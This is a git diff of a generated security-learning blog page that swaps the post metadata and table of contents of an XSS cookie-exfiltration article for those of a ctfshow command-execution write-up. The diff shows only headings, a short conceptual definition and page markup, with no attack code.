+          <img data-src="/covers/furina-de-fontaine-3840x2160-19459.jpg" data-sizes="auto" alt="Web入门——爆破" class="lazyload">
+      <a href="/2026/07/20/Web%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E7%88%86%E7%A0%B4/" aria-label="Next: Web入门——爆破"  title="Next: Web入门——爆破"></a>
       <div class="article-nav-caption">Next</div>
       <h3 class="article-nav-title">
-          PHP反序列化漏洞
+          Web入门——爆破
       </h3>
     </div>
   </nav>
@@ -412,7 +394,7 @@
   <div class="sidebar-wrap">
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xss%E5%A4%96%E5%B8%A6cookie%E6%94%BB%E5%87%BB"><span class="toc-number">1.</span> <span class="toc-text"> xss外带cookie攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.</span> <span class="toc-text"> 一.概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%94%BB%E5%87%BB%E5%A7%BF%E5%8A%BF"><span class="toc-number">1.2.</span> <span class="toc-text"> 二.攻击姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fetch%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.1.</span> <span class="toc-text"> fetch()方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#windowopen%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.2.</span> <span class="toc-text"> window.open方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xhr%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.3.</span> <span class="toc-text"> XHR方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xmlhttprequest-%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.2.4.</span> <span class="toc-text"> XMLHttpRequest 对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#windowlocation-%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.2.5.</span> <span class="toc-text"> window.location 对象</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#windowlocationhref"><span class="toc-number">1.2.5.1.</span> <span class="toc-text"> window.location.href</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#documentwrite%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.6.</span> <span class="toc-text"> document.write方法</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text"> 命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1web29"><span class="toc-number">1.1.</span> <span class="toc-text"> 1.web29</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2web30"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.web30</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3web38"><span class="toc-number">1.3.</span> <span class="toc-text"> 3.web38</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4web74"><span class="toc-number">1.4.</span> <span class="toc-text"> 4.web74</span></a></li></ol></li></ol>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -545,13 +527,13 @@
       <script data-pjax>
         window.REIMU_POST = {
           author: "Cl1ck-t0",
-          title: "xss外带cookie攻击",
-          url: "https://cl1ck-t0.github.io/2026/02/09/xss%E5%A4%96%E5%B8%A6cookie%E6%94%BB%E5%87%BB/",
+          title: "命令执行",
+          url: "https://cl1ck-t0.github.io/2026/07/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
           excerpt: "",
           description: "",
-          stripContent: " xss外带cookie攻击 写在本文之前：本文为小灯自主学习xss外带内容的总结与思考。  一.概念 XSS 的 Cookie 外带攻击就是一种针对 Web 应用程序中的 XSS（跨站脚本攻击）漏洞进行的攻击，攻击者通过在 XSS 攻击中注入恶意脚本，从而窃取用户的 Cookie 信息。攻击者通过已有的xss漏洞在浏览器注入恶意代码，并将受害者的 Cookie 数据上传到攻击者控制的服务器上，这就是xss外带cookie攻击的核心。  二.攻击姿势 xss外带cookie攻击姿势与xss基本无",
-          date: "Mon Feb 09 2026 15:50:09 GMT+0800",
-          updated: "Tue Feb 24 2026 19:58:03 GMT+0800",
+          stripContent: " 命令执行 ctfshow web入门篇  1.web29 1234567891011121314151617181920212223&amp;lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 00:26:48# @email: h1xa@ctfer.com# @link: htt",
+          date: "Tue Jul 21 2026 10:01:34 GMT+0800",
+          updated: "Tue Jul 21 2026 12:18:15 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
